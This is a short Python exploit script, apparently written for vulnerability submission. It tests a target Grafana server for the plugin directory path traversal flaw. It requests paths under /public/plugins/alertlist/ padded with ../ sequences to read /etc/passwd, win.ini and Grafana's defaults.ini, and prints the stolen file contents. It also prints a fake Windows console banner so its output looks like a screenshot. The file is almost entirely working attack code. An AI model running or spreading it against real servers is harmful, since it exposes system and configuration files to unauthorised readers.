#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import urllib
import sys
import json
import re

urllib3.disable_warnings()

def verify(target):
    plugin_list = [
        '/public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../etc/passwd',
        '/public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../windows/win.ini',
        '/public/plugins/alertlist/../../../../../conf/defaults.ini'
    ]
    headers = {"User-Agent": "Mozilla/5.0 (X11; Gentoo; rv:82.1) Gecko/20100101 Firefox/82.1"}
    site = "/".join(target.split("/")[:3])
    for plugin_path in plugin_list:
        payload = site + plugin_path
        try:
            re = urllib.request.Request(url=payload, headers=headers)
            res = urllib.request.urlopen(re, timeout=3)
            code = res.getcode()
            context = res.read()
            # print("payload：" + paylaod)
            if ("root:x" in context.decode('utf-8') or "/tmp/grafana.sock" in context.decode('utf-8') or "[fonts]" in context.decode('utf-8') ) and code == 200:
                print("发现漏洞可以利用，payload：", payload)
                return  context.decode('utf-8')[:1000]
        except:
            #print(sys.exc_info())
            pass
    return False


if __name__=="__main__":
    target = sys.argv[1]
    print("Microsoft Windows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 grafana-file-read.py ",target)
    info = verify(target)
    if info:
        print("[+]漏洞存在，读取到的结果为：", info)
    else:
        print("[-]漏洞不存在")
